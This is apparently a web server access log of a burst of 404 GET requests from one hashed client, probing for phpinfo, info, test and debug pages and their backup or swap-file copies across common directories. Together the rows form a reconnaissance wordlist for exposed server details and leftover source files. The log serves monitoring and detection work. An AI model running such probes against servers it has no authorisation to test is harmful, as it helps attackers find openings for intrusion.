043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:48;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php_info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/_profiler/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:49;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:50;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:51;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:52;;/tmp/phpinfo.php.save;GET;404
